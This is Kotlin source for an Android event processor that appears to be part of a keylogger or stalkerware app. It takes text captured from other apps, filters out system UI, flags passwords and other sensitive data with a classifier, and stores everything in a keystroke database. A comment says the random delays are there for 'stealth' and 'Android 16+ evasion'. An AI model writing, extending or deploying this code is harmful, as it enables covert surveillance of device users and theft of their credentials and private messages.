package com.android.myapp.capture

import android.content.Context
import com.android.myapp.data.CapturedEvent
import com.android.myapp.data.repository.KeystrokeRepository
import com.android.myapp.ml.SensitiveDataDetector
import kotlinx.coroutines.*
import timber.log.Timber
import kotlin.random.Random

/**
 * Processes captured events with rate limiting and batching
 */
class EventProcessor(private val context: Context) {

    private val repository = KeystrokeRepository(context)
    private val detector = SensitiveDataDetector(context)
    private val processingScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val eventQueue = mutableListOf<CapturedEvent>()
    private val maxQueueSize = 50
    private var lastProcessTime = 0L
    private val minProcessInterval = 1000L // 1 second minimum between processing

    /**
     * Process a captured event
     */
    suspend fun processEvent(event: CapturedEvent) {
        withContext(Dispatchers.IO) {
            try {
                // Add random delay for stealth (Android 16+ evasion)
                addStealthDelay()

                // Filter out non-interesting events
                if (!isInterestingEvent(event)) {
                    return@withContext
                }

                // FIXED: Get batch to process OUTSIDE synchronized block
                val batchToProcess: List<CapturedEvent>? = synchronized(eventQueue) {
                    eventQueue.add(event)

                    // Check if we should process now
                    if (eventQueue.size >= maxQueueSize || shouldProcessNow()) {
                        // Create copy and clear queue
                        val copy = eventQueue.toList()
                        eventQueue.clear()
                        copy  // Return copy
                    } else {
                        null  // Don't process yet
                    }
                }

                // FIXED: Process batch OUTSIDE synchronized block
                batchToProcess?.let { batch ->
                    processBatch(batch)
                }

            } catch (e: Exception) {
                Timber.e(e, "Error processing event")
            }
        }
    }

    private suspend fun addStealthDelay() {
        // Random delay between 10-100ms to avoid detection patterns
        val delay = Random.nextLong(10, 100)
        delay(delay)
    }

    private fun isInterestingEvent(event: CapturedEvent): Boolean {
        // Filter out irrelevant places, system apps and our own package
        if (
            event.packageName == context.packageName ||
            event.packageName.split(".").last() == "home" ||
            event.packageName.split(".").last() == "googlequicksearchbox" ||
            event.packageName.split(".").last() == "settings"
            )
        {
            return false
        }

        // Filter out empty text events
        if (event.text.isNullOrEmpty() && event.contentDescription.isNullOrEmpty()) {
            return false
        }

        // Filter out system UI noise
        val systemPackages = listOf(
            "com.android.systemui",
            "com.android.launcher",
            "com.google.android.apps.nexuslauncher"
        )

        if (systemPackages.any { event.packageName.contains(it) }) {
            return false
        }

        return true
    }

    private fun shouldProcessNow(): Boolean {
        val now = System.currentTimeMillis()
        return (now - lastProcessTime) > minProcessInterval
    }

    // FIXED: Accept batch as parameter instead of accessing synchronized block
    private suspend fun processBatch(batch: List<CapturedEvent>) {
        if (batch.isEmpty()) return

        lastProcessTime = System.currentTimeMillis()
        Timber.d("Processing batch of ${batch.size} events")

        batch.forEach { event ->
            processIndividualEvent(event)
        }
    }

    private suspend fun processIndividualEvent(event: CapturedEvent) {
        try {
            // Detect if this is sensitive data
            val classification = event.text?.let { text ->
                detector.classifySensitivity(text, event)
            }

            // Create enriched event
            val enrichedEvent = event.copy(
                isSensitive = classification?.isSensitive ?: false,
                sensitivityType = classification?.type,
                confidence = classification?.confidence
            )

            // Save to database
            repository.saveEvent(enrichedEvent)

            // Log sensitive data separately
            if (enrichedEvent.isSensitive) {
                Timber.d("Sensitive data detected: ${classification?.type} (${classification?.confidence})")
            }

        } catch (e: Exception) {
            Timber.e(e, "Error processing individual event")
        }
    }

    /**
     * Force process any pending events
     */
    suspend fun flush() {
        withContext(Dispatchers.IO) {
            // FIXED: Get batch outside synchronized block
            val batchToProcess = synchronized(eventQueue) {
                if (eventQueue.isNotEmpty()) {
                    val copy = eventQueue.toList()
                    eventQueue.clear()
                    copy
                } else {
                    null
                }
            }

            // FIXED: Process outside synchronized block
            batchToProcess?.let { processBatch(it) }
        }
    }

    fun cleanup() {
        processingScope.cancel()
    }
}